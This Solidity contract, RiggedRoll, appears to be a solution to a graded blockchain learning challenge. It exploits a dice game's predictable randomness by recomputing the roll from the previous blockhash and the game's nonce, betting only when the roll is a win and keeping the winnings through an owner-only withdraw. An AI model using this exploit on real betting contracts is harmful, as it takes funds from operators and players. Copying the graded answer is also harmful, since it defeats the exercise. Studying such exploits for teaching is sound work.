pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    error ROLL_NUMBER_NOT_WINNER();

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        (bool suc, ) = _addr.call{value: _amount}("");
        require(suc, "Failed to withdraw Ether");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        require(
            address(this).balance >= .002 ether,
            "Failed to send enough value"
        );
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
        );

        uint256 roll = uint256(hash) % 16;

        // console.log("\t", "   Address:", address(diceGame));
        // console.log("\t", "   Nonce:", diceGame.nonce());
        console.log("\t", "   Dice Game Roll:", roll);

        if (roll <= 2) {
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            revert ROLL_NUMBER_NOT_WINNER();
        }
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
}
